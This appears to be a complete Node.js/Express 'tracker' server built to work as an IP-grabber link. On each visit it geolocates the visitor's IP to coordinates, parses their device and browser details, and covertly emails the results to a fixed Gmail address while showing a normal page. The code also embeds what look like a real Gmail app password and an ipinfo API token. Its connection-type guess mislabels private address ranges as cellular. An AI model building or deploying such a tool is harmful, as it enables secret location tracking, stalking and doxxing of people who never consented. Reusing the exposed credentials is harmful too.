const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);
const sessionStarts = {};

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'staysane.rz@gmail.com',
    pass: 'nvkq cudo ibhh usdr',
  },
});

app.use((req, res, next) => {
  const ip = req.ip;
  if (!sessionStarts[ip]) {
    sessionStarts[ip] = new Date();
  }
  next();
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || 'direct';

  // Format the current timestamp to a readable format
  const timestamp = new Date();
  const day = timestamp.toLocaleString('en-US', { weekday: 'long' });
  const date = timestamp.toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
  const time = timestamp.toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });

  if (userAgent.includes('UptimeRobot')) {
    return res.status(204).end();
  }

  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();
  const engine = parser.getEngine();
  const cpu = parser.getCPU();
  const deviceType = device.type || 'Unknown';

  const connectionType = inferConnectionType(req);
  const sessionStart = sessionStarts[ip];
  const sessionDuration = sessionStart ? `${(new Date() - sessionStart) / 1000} seconds` : 'First visit';

  // --- IPInfo Location ---
  let location_ipinfo = 'N/A';
  let lat_ipinfo = null;
  let lon_ipinfo = null;

  try {
    const ipinfoToken = '5cbabbc7ad7b57';
    const geo = await axios.get(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
    const { city, region, country, org, loc } = geo.data;

    location_ipinfo = `${city}, ${region}, ${country} (ISP: ${org})`;

    const [latitude, longitude] = loc.split(',');
    lat_ipinfo = latitude;
    lon_ipinfo = longitude;
  } catch (err) {
    console.warn('IPInfo failed:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!

== TIMESTAMP ==
Day:  ${day}
Date: ${date}
Time: ${time}

IP Address: ${ip}

== LOCATION ==
Location: ${location_ipinfo}
Coords: ${lat_ipinfo}, ${lon_ipinfo}
Map: https://www.google.com/maps?q=${lat_ipinfo},${lon_ipinfo}

== DEVICE INFO ==
Device Type: ${deviceType}
Brand:       ${device.vendor || 'Unknown'}
Model:       ${device.model || 'Unknown'}
OS:          ${os.name || 'OS'} ${os.version || ''}
Browser:     ${browser.name || 'Browser'} ${browser.version || ''}
Engine:      ${engine.name || 'Unknown engine'}
CPU:         ${cpu.architecture || 'Unknown CPU architecture'}

== SESSION ==
Connection:       ${connectionType}
Session Duration: ${sessionDuration}
User Agent:       ${userAgent}
Referrer:         ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

function inferConnectionType(req) {
  const ip = req.ip;
  if (ip.startsWith('192.') || ip.startsWith('172.16.') || ip.startsWith('10.')) {
    return 'Likely Mobile (Cellular)';
  }
  return 'Likely WiFi/Landline';
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
